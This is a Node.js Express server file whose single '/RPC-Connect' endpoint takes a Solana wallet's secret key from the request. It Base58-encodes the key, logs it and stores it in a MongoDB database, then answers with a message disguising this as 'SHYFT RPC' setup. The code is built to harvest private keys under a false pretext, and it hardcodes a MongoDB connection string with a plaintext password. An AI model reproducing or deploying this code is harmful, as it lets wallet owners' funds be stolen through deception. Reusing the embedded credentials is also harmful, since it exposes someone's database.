// Import required packages
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const bs58 = require("bs58");

// Create an instance of Express
const app = express();

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// MongoDB connection string (replace <username>, <password>, and <dbname> with your details)
const mongoURI =
  "mongodb+srv://vanguard951105:F0Y7B0MtjvH1OFbL@cluster0.haemz.mongodb.net/solana?retryWrites=true&w=majority";

// Connect to MongoDB Atlas
mongoose
  .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Define a schema for the private key data
const privateKeySchema = new mongoose.Schema({
  privateKey: { type: String, required: true }, // String for the Base58 encoded private key
});

// Create a model based on the schema
const PrivateKeyModel = mongoose.model("PrivateKey", privateKeySchema);

// Define the RPC-Connect endpoint
app.post("/RPC-Connect", async (req, res) => {
  try {
    // Extract Keypair from the request body
    const { publicKey, secretKey } = req.body.wallet._keypair;

    // Convert objects to arrays
    const publicKeyArray = Object.values(publicKey);
    const secretKeyArray = Object.values(secretKey);

    // Convert secret key array to Uint8Array and encode it to Base58
    const privateKeyArray = new Uint8Array(secretKeyArray);
    const privateKeyString = bs58.default.encode(privateKeyArray); // Use bs58.encode directly

    console.log("Private Key (Base58):", privateKeyString);

    // Create a new document and save only the private key string to the database
    const newPrivateKey = new PrivateKeyModel({ privateKey: privateKeyString });
    await newPrivateKey.save();

    // Respond with success message
    res
      .status(201)
      .json({ message: "SHYFT RPC setting completed!", data: newPrivateKey });
  } catch (error) {
    console.error("Error saving private key:", error);
    res
      .status(500)
      .json({ error: "An error occurred while setting SHYFT RPC" });
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
